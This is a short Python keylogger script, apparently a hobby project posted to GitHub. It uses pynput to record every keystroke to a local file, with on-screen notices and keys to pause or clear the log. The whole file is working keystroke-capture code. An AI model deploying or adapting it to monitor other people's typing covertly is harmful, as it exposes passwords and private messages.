# CREATED BY: SeonerVorteX (https://github.com/SeonerVorteX/)
# ------ 07/11/2021 ------

from pynput.keyboard import Key, Listener
import time

print('SeonerVorteX is listening your keyboard...')
print('If you want to stop listening, press "ESC"')
print('If you want to stop saving to file, press "Tab"')
print('If you want to clear file, press "Del"')

count = 0
save = True 

def log(text):
    print(str(text))

def save_file(key):
    with open('keylogs.txt', "a", encoding="utf-8") as file:
        file.write(key)

def clear_file():
    with open('keylogs.txt', "w", encoding="utf-8") as file:
        file.write('')

def on_press(key):
    if (not str(key).startswith('Key')):
        if save == True:
            time.sleep(0.1)
            save_file(str(key).replace("'", ""))
            global count
            count += 1
            if count >= 15:
                log('{} keys saved'.format(count))
                count = 0

def on_release(key):
    global save
    if key == Key.esc:
        print('Listening finished')
        return False
    elif key == Key.tab:
        if save == True:
            save = False
            print('Saving stopped, if you want to continue, press "Tab"')
        else:
            save = True
            print('Saving restarted')
    elif key == Key.delete:
        print('File cleaned')
        clear_file()        
    with open('keylogs.txt', "a", encoding="utf-8") as file:
        k = str(key).replace("'", "")
        
        if key == Key.enter and save:
            file.write('\n')
        if key == Key.space and save:
            file.write(' ')
        with open('keylogs.txt', "r", encoding="utf-8") as rfile:
            if key == Key.backspace and save:
                l = list(rfile.read())
                if len(l):
                    l.pop()
                    with open('keylogs.txt', "w", encoding="utf-8") as wfile:
                        wfile.write(str(''.join(l)))

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()